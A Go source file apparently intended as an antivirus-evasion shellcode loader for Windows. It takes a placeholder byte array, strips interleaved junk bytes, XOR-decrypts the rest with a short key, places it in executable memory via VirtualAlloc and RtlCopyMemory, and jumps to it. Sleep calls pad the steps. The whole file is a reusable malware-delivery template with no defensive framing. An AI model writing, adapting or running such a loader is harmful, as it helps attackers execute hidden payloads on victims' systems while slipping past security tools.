package main

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。

)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	mix_shellcode := []byte{} //填在这里
	var ttyolller []byte
	key := []byte("iqe")
	var key_size = len(key)
	var shellcode_final []byte
	var j = 0
	time.Sleep(2)
	// 去除垃圾代码
	fmt.Print(len(mix_shellcode))
	for i := 0; i < len(mix_shellcode); i++ {
		if (i % 2 == 0) {
			shellcode_final = append(shellcode_final,mix_shellcode[i])
			j += 1
		}
	}
	time.Sleep(3)
	fmt.Print(shellcode_final)
	// 解密异或
	for i := 0; i < len(shellcode_final); i++ {
		ttyolller = append(ttyolller, shellcode_final[i]^key[i % key_size])
	}
	time.Sleep(3)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(ttyolller)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(3)
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&ttyolller[0])), uintptr(len(ttyolller)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}